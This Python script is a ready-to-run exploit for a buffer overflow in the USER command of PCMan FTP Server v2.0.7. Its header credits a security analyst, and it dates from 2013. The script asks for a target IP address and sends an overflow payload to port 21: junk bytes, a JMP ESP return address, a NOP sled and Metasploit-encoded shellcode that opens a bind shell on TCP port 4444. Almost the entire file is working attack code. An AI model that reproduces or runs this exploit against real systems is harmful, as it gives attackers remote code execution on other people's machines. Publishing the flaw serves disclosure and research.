#!/usr/bin/env python

import signal
from time import sleep
from socket import *
from sys import exit, exc_info

#
# Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
# Discovered and Reported******June 2013 
# Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
# Exploit/Advisory*************http://infosec42.blogspot.com/
# Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
# Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
# CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending
#


def sigHandle(signum, frm): # Signal handler
    
    print "\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)


def targServer():
    
    while True:    
        try:
            server = inet_aton(raw_input("\n[*] Please enter the IPv4 address of the PCMan FTP Server:\n\n>"))
            server = inet_ntoa(server)
            break
        except:
            print "\n\n[!!!] Error: Please enter a valid IPv4 address. [!!!]\n\n"
            sleep(1)
            continue
            
    return server   


def main():
      
    print ("""\n [*] Title************************PCMan FTP Server v2.0.7 Remote Root Shell Exploit - USER Command
 [*] Discovered and Reported******June 2013 
 [*] Discovered/Exploited By******Jacob Holcomb/Gimppy, Security Analyst @ Independent Security Evaluators
 [*] Exploit/Advisory*************http://infosec42.blogspot.com/
 [*] Software*********************PCMan FTP Server v2.0.7 (Listens on TCP/21)
 [*] Tested Commands*************USER (Other commands were not tested and may be vulnerable) 
 [*] CVE**************************PCMan FTP Server v2.0.7 Buffer Overflow: Pending""")
    signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
    victim = targServer()
    port = int(21)
    Cmd = "USER " #Vulnerable command
    JuNk = "\x42" * 2004
    # KERNEL32.dll 7CA58265 - JMP ESP
    ret = "\x65\x82\xA5\x7C"    
    NOP = "\x90" * 50

    #348 Bytes Bind Shell Port TCP/4444
    #msfpayload windows/shell_bind_tcp EXITFUNC=thread LPORT=4444 R | 
    #msfencode -e x86/shikata_ga_nai -c 1 -b "\x0d\x0a\x00\xf1" R
    shellcode = "\xdb\xcc\xba\x40\xb6\x7d\xba\xd9\x74\x24\xf4\x58\x29\xc9"
    shellcode += "\xb1\x50\x31\x50\x18\x03\x50\x18\x83\xe8\xbc\x54\x88\x46"
    shellcode += "\x56\x72\x3e\x5f\x5f\x7b\x3e\x60\xff\x0f\xad\xbb\xdb\x84"
    shellcode += "\x6b\xf8\xa8\xe7\x76\x78\xaf\xf8\xf2\x37\xb7\x8d\x5a\xe8"
    shellcode += "\xc6\x7a\x2d\x63\xfc\xf7\xaf\x9d\xcd\xc7\x29\xcd\xa9\x08"
    shellcode += "\x3d\x09\x70\x42\xb3\x14\xb0\xb8\x38\x2d\x60\x1b\xe9\x27"
    shellcode += "\x6d\xe8\xb6\xe3\x6c\x04\x2e\x67\x62\x91\x24\x28\x66\x24"
    shellcode += "\xd0\xd4\xba\xad\xaf\xb7\xe6\xad\xce\x84\xd7\x16\x74\x80"
    shellcode += "\x54\x99\xfe\xd6\x56\x52\x70\xcb\xcb\xef\x31\xfb\x4d\x98"
    shellcode += "\x3f\xb5\x7f\xb4\x10\xb5\xa9\x22\xc2\x2f\x3d\x98\xd6\xc7"
    shellcode += "\xca\xad\x24\x47\x60\xad\x99\x1f\x43\xbc\xe6\xdb\x03\xc0"
    shellcode += "\xc1\x43\x2a\xdb\x88\xfa\xc1\x2c\x57\xa8\x73\x2f\xa8\x82"
    shellcode += "\xeb\xf6\x5f\xd6\x46\x5f\x9f\xce\xcb\x33\x0c\xbc\xb8\xf0"
    shellcode += "\xe1\x01\x6d\x08\xd5\xe0\xf9\xe7\x8a\x8a\xaa\x8e\xd2\xc6"
    shellcode += "\x24\x35\x0e\x99\x73\x62\xd0\x8f\x11\x9d\x7f\x65\x1a\x4d"
    shellcode += "\x17\x21\x49\x40\x01\x7e\x6e\x4b\x82\xd4\x6f\xa4\x4d\x32"
    shellcode += "\xc6\xc3\xc7\xeb\x27\x1d\x87\x47\x83\xf7\xd7\xb8\xb8\x90"
    shellcode += "\xc0\x40\x78\x19\x58\x4c\x52\x8f\x99\x62\x3c\x5a\x02\xe5"
    shellcode += "\xa8\xf9\xa7\x60\xcd\x94\x67\x2a\x24\xa5\x01\x2b\x5c\x71"
    shellcode += "\x9b\x56\x91\xb9\x68\x3c\x2f\x7b\xa2\xbf\x8d\x50\x2f\xb2"
    shellcode += "\x6b\x91\xe4\x66\x20\x89\x88\x86\x85\x5c\x92\x02\xad\x9f"
    shellcode += "\xba\xb6\x7a\x32\x12\x18\xd5\xd8\x95\xcb\x84\x49\xc7\x14"
    shellcode += "\xf6\x1a\x4a\x33\xf3\x14\xc7\x3b\x2d\xc2\x17\x3c\xe6\xec"
    shellcode += "\x38\x48\x5f\xef\x3a\x8b\x3b\xf0\xeb\x46\x3c\xde\x7c\x88"
    shellcode += "\x0c\x3f\x1c\x05\x6f\x16\x22\x79"

    sploit = Cmd + JuNk + ret + NOP + shellcode
    sploit += "\x42" * (2992 - len(NOP + shellcode)) + "\r\n"

    try:
        print "\n [*] Creating network socket."
        net_sock = socket(AF_INET, SOCK_STREAM)
    except:
        print "\n [!!!] There was an error creating the network socket. [!!!]\n\n%s\n" % exc_info()       
        sleep(1)
        exit(0)    

    try:
        print " [*] Connecting to PCMan FTP Server @ %s on port TCP/%d." % (victim, port)
        net_sock.connect((victim, port))
    except:
        print "\n [!!!] There was an error connecting to %s. [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)
 
    try:
        print """ [*] Attempting to exploit the FTP USER command.
 [*] Sending 1337 ro0t Sh3ll exploit to %s on TCP port %d.
 [*] Payload Length: %d bytes.""" % (victim, port, len(sploit))
        net_sock.send(sploit)
        sleep(1)
    except:
        print "\n [!!!] There was an error sending the 1337 ro0t Sh3ll exploit to %s [!!!]\n\n%s\n" % (victim, exc_info())
        sleep(1)
        exit(0)

    try:
        print """ [*] 1337 ro0t Sh3ll exploit was sent! Fingers crossed for code execution!
 [*] Closing network socket. Press ctrl + c repeatedly to force exploit cleanup.\n"""
        net_sock.close()
    except:
        print "\n [!!!] There was an error closing the network socket. [!!!]\n\n%s\n" % exc_info()
        sleep(1)
        exit(0)


if __name__ == "__main__":
    main()